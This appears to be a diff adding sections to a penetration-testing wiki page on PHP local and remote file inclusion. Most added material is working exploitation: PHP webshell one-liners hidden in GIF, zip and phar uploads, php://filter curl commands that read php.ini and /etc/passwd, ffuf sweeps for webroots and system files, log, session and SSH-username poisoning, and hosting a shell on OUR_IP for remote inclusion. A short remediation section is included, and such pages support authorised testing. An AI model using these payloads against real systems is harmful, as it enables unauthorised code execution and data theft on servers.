@@ -37,8 +37,6 @@ UNDER the webroot, so dump `config.php` and the app source: it usually hands you
 - For RCE: ability to write PHP code somewhere on the filesystem the application can include (log files, session files, upload directory)
 - For RFI: PHP `allow_url_include` directive enabled (rare in modern configs)
 
-## Methodology
-
 ### 1. Identify injection points
 
 Look for parameters that appear to load file content:
@@ -242,8 +240,6 @@ The output is a long `php://filter/...` chain. Append `&0=id` to execute command
 ```
 
 Reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
-
-## LFI to RCE
 
 ### Method 1: Log poisoning
 
@@ -663,3 +659,180 @@ GET /image?filename=../../../etc/passwd%00.png
 ```
 
 `%00` is a null byte — it terminates the C-string, so the OS sees `../../../etc/passwd` only.
+
+## Sink functions by language (read vs execute vs remote)
+
+Whitebox or source-disclosure triage: which sink the parameter reaches decides the ceiling (file read vs code exec vs remote include). Same input in a read-only sink is still source disclosure, but every inclusion-RCE technique below needs an execute-capable sink.
+
+| Language | Sink | Read | Execute | Remote URL |
+|---|---|:-:|:-:|:-:|
+| PHP | `include()` / `include_once()` | yes | yes | yes |
+| PHP | `require()` / `require_once()` | yes | yes | no |
+| PHP | `file_get_contents()` | yes | no | yes |
+| PHP | `fopen()` / `file()` | yes | no | no |
+| NodeJS | `fs.readFile()` / `fs.sendFile()` | yes | no | no |
+| NodeJS | `res.render()` (Express) | yes | yes | no |
+| Java | `<jsp:include>` | yes | no | no |
+| Java | `<c:import>` | yes | yes | yes |
+| .NET | `@Html.Partial()` / `Response.WriteFile()` | yes | no | no |
+| .NET | `@Html.RemotePartial()` | yes | no | yes |
+| .NET | `<!--#include file=...-->` | yes | yes | yes |
+
+Any RFI also needs `allow_url_include`-class config on top of a URL-capable sink.
+
+## Input shapes beyond `?page=`
+
+- **Filename prefix:** code prepends a string (`include("lang_" . $param)`) so traversal dies on `lang_../../...`; start the payload with `/` to turn the prefix into a directory component (`/../../../etc/passwd`). Caveat: the prefix still breaks wrapper and RFI payloads.
+- **Second-order LFI:** poison a STORED value (username, profile field) with a traversal payload; a later function pulls a file from that DB value (e.g. avatar download by username). Developers validate direct request input, not values read back from their own database, so check stored-echo fields too.
+
+<!-- promoted-slug: file-inclusion-sinks-by-language -->
+
+## Remediation deltas (report-ready, beyond generic allowlist advice)
+
+- **`open_basedir=/var/www` in php.ini:** jails file access to the webroot; even a confirmed LFI cannot reach `/etc`, logs, or sessions. Docker-with-webroot-only-mount achieves the same.
+- **Kill remote includes:** `allow_url_fopen=Off` + `allow_url_include=Off` together; one without the other leaves `file_get_contents('http://...')` (SSRF) or data-wrapper includes alive.
+- **Strip recursively, not once:** a single-pass `str_replace('../','')` is bypassed by `....//`; loop until the count hits zero:
+
+```php
+while (substr_count($input, '../')) { $input = str_replace('../', '', $input); }
+```
+
+- **Prefer the language's native basename()** (PHP `basename()`, etc.) over hand-rolled trimmers: custom parsers miss edge cases. Example: shells expand `?`/`*` as `.` (`cat .?/.*/.?/etc/passwd` works in bash) while PHP `file_get_contents` does not; if the app later shells out (`system()`), a custom filter that ignores wildcards reopens traversal. Native functions carry the community's edge-case fixes.
+- **Disable dangerous extras:** the `expect` extension and `mod_userdir` when unused (each is a direct LFI-to-RCE wrapper).
+- **WAF in permissive/detect-only mode** (e.g. ModSecurity) still pays off: rule hits become an early-warning signal while tuning avoids blocking legitimate traffic; hardened apps are meant to buy defenders time and loggable tells, not to be left unwatched.
+
+<!-- promoted-slug: lfi-hardening-remediation -->
+
+## Read php.ini through the LFI before burning RCE attempts
+
+`data://`, `php://input`, and any RFI all need `allow_url_include=On` (off by default). Check it first instead of guessing: pull the config through the base64 filter and grep.
+
+```sh
+curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | tee /tmp/ini.txt
+grep -o 'W1BIUF0.*' /tmp/ini.txt | tr -d '\n' | base64 -d | grep -E 'allow_url_include|expect'
+```
+
+- Path varies by SAPI and version: `/etc/php/X.Y/apache2/php.ini` (Apache mod_php) or `/etc/php/X.Y/fpm/php.ini` (Nginx/FPM). Iterate versions 8.x down to 7.x until one decodes.
+- `allow_url_include = On` gates `data://`, `php://input`, `http(s)://`, `ftp://` includes; not uncommon because some CMS plugins need it.
+- `extension=expect` only proves the config TRIES to load `expect://`; confirm at runtime by actually executing a command through it.
+- Windows equivalents: `C:\xampp\php\php.ini` and friends.
+
+## Source-crawl instead of blind fuzzing
+
+Once source disclosure works, enumerate `.php` files with ffuf at ALL status codes (301/302/403 pages are readable through LFI even when they redirect or block in a browser), then read each disclosed file and harvest its `include`/`require` references for the next round; iterate until the include graph closes. Payload lists: [[lfi-path-traversal]], [[wordlists]].
+
+<!-- promoted-slug: lfi-php-config-recon -->
+
+## LFI + upload: the upload form only needs to EXIST
+
+The upload does not have to be vulnerable. With an execute-capable sink, `include()` runs PHP inside ANY uploaded file regardless of extension or content type; only the include primitive is the vuln. Combine any file upload feature with the LFI to get RCE.
+
+**GIF trick (most reliable, any stack):** allowed extension + ASCII magic bytes satisfy extension and content-type checks; the include executes the rest of the file.
+
+```sh
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+# upload, then: ?language=./profile_images/shell.gif&cmd=id
+# if a dir is prefixed, ../ out of it first
+```
+
+**Predicting the stored name:** when the server renames uploads by content hash (`md5_file()`), compute it locally before uploading: `md5sum shell.php` gives the future filename inside `/uploads`, no directory listing needed. If the upload path is unknown, find it in the upload handler's source (read it via the LFI) or fuzz uploads dirs.
+
+**zip:// wrapper (PHP):** zip the shell, keep a benign extension, reference the inner file with an encoded `#`:
+
+```sh
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+# ?language=zip://./uploads/shell.jpg%23shell.php&cmd=id
+```
+
+**phar:// wrapper (PHP):** build the archive, rename to an allowed extension, reference the sub-file:
+
+```sh
+php --define phar.readonly=0 gen.php && mv shell.phar shell.jpg
+# ?language=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id
+```
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+```
+
+`phar://` also gives deserialization (POP chains) with no code-include at all; see [[path-traversal-lfi]] and [[lfi-path-traversal]].
+
+<!-- promoted-slug: lfi-upload-inclusion-rce -->
+
+## Find the webroot by fuzzing, then the log dir by config-read
+
+When relative traversal cannot reach the uploads dir (or the include needs an absolute path), locate the webroot:
+
+```sh
+ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'http://TARGET/index.php?language=../../../../FUZZ/index.php' -fs <baseline-size>
+```
+
+(SecLists `Discovery/Web-Content/default-web-root-directory-{linux,windows}.txt`; `-fs` = size of the error/baseline response so only real files surface.)
+
+Then chain config reads instead of guessing log paths:
+
+1. `/etc/apache2/apache2.conf` -> `DocumentRoot` + `ErrorLog ${APACHE_LOG_DIR}/error.log` / `CustomLog ... access.log`.
+2. The `${APACHE_LOG_DIR}` variable resolves in `/etc/apache2/envvars` (`export APACHE_LOG_DIR=/var/log/apache2`), read that too; Nginx equivalent: `/etc/nginx/nginx.conf`.
+3. Same pass exposes the run user (`www-data`), PID file, and module configs under `mods-enabled/`.
+
+## Precise file enumeration
+
+LFI-Jhaddix is broad; for a targeted sweep of readable system/server files use DragonJAR `LFI-WordList-Linux` / `LFI-WordList-Windows` (not in SecLists, download them), which return far more hits on misconfigured hosts:
+
+```sh
+ffuf -w LFI-WordList-Linux:FUZZ -u 'http://TARGET/index.php?language=../../../../FUZZ' -fs <baseline-size>
+```
+
+Wordlist selection generally: [[wordlists]]; payload page [[lfi-path-traversal]].
+
+<!-- promoted-slug: lfi-webroot-config-discovery -->
+
+## Log poisoning: read-privilege matrix and paths
+
+The technique fails silently when the web user cannot READ the log; know the defaults before grinding:
+
+- **Nginx:** `/var/log/nginx/access.log` is readable by low-privilege users (`www-data`) BY DEFAULT; try it first.
+- **Apache:** `/var/log/apache2/access.log` + `error.log` are root/`adm` only by default; readable only on older or misconfigured boxes.
+- **Windows:** `C:\xampp\apache\logs\`, `C:\nginx\log\`; PHP sessions land in `C:\Windows\Temp\`.
+- Path unknown: fuzz it ([[wordlists]] LFI lists) or resolve it from the server config, then fall back to `/proc/self/fd/N` (N ~ 0-50) and `/proc/self/environ` (User-Agent is in both).
+
+## Session poisoning mechanics
+
+Session file is `/var/lib/php/sessions/sess_<PHPSESSID>`. Read it FIRST to find which key is attacker-controlled (`page` from the language param, not the auto-set `preference`), poison through that exact param, then include the file. The session file is OVERWRITTEN on every request, so the web shell dies after each inclusion: re-send the poison for every command, or use the first execution to write a permanent shell / fire a reverse shell.
+
+## Beyond web logs: poison the protocol field you control
+
+Generalize: any readable file that stores an attacker-controlled field can carry the payload.
+
+- SSH/FTP exposed: log in with the PHP code AS THE USERNAME (a failed login still logs it), then include `/var/log/sshd.log` / `/var/log/vsftpd.log` / auth.log.
+- SMTP reachable: email PHP code to a local user, include `/var/mail/<user>`.
+- Logs are huge; each include re-parses the whole file, so poison once, include once, do not reload in a loop.
+
+<!-- promoted-slug: log-poisoning-permissions-paths -->
+
+## RFI verification flow (before hosting anything)
+
+`allow_url_include=On` is necessary but not sufficient (the sink may still reject URLs). Verify by including a LOCAL url first, which also rules out firewall false negatives: `?language=http://127.0.0.1:80/index.php`. If it renders (executed, not echoed), the box does RFI and the sink executes code. Do NOT include the vulnerable page itself as the test payload, a self-including page recurses and can DoS the target.
+
+Side effect: RFI doubles as SSRF; iterate `http://127.0.0.1:PORT/` to enumerate local-only services through it.
+
+## Hosting the payload
+
+```sh
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sudo python3 -m http.server 80            # or: sudo python3 -m pyftpdlib -p 21
+impacket-smbserver -smb2support share $(pwd)
+```
+
+- `http://OUR_IP/shell.php&cmd=id`; prefer 80/443, they are the ports a firewall is likeliest to allow outbound.
+- `ftp://OUR_IP/shell.php` when `http://` is WAF-blocked; PHP authenticates anonymous by default, `ftp://user:pass@OUR_IP/shell.php` if the FTP server demands creds.
+- SMB via UNC (`\\OUR_IP\share\shell.php`) works on Windows targets WITHOUT `allow_url_include` (remote SMB files are treated as local paths), but is same-segment dependent; outbound SMB over the internet is usually blocked.
+- Watch the listener log: an appended `.php` on the requested filename means the app appends an extension, drop it from your payload.
+- Send the working include to Burp Repeater so the operator can replay the RCE.
+
+<!-- promoted-slug: rfi-verification-flow -->
